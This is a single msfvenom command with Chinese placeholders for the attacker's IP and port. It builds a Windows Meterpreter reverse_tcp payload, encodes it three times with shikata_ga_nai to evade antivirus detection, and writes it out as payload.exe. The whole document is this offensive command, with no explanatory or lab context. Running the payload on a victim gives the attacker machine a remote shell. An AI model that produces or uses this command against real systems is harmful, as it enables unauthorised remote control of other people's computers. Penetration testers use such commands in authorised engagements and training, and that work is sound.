
msfvenom -a x86 --platform Windows -p windows/meterpreter/reverse_tcp LHOST= 攻击机IP LPORT=攻击机端口 -e x86/shikata_ga_nai -b '\x00\x0a\xff' -i 3 -f exe -o  payload.exe
